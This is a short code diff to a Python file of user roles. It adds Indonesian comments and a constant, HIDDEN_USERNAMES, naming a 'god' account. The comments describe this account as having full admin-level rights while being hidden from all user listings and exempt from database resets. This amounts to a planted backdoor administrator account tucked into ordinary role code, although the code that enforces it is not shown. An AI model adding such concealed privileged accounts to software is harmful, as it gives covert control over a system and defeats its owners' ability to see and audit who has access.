@@ -1,6 +1,13 @@
 from enum import Enum
 
 
+# User stealth: ada di DB, hak akses penuh seperti admin, tapi disembunyikan
+# dari semua daftar user (API list users & user-cash) dan tidak dihapus reset_db.
+# ponytail: konstanta, bukan kolom DB — tambah kolom `is_hidden` kalau perlu
+# banyak user stealth dengan toggle runtime.
+HIDDEN_USERNAMES = frozenset({"god"})
+
+
 class UserRole(str, Enum):
     """User roles in the system."""
 
